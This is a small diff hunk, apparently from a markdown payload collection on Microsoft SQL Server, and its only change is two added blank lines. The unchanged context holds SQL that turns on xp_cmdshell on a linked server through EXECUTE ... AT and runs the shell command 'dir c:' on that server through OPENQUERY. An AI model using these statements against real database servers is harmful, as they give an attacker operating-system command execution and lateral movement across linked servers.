@@ -18,3 +18,5 @@ updated_at: '2023-04-10T20:22:42.442119+00:00'
 EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer
 select 1 from openquery("linkedserver",'select 1;exec master..xp_cmdshell "dir c:"')
 ```
+
+
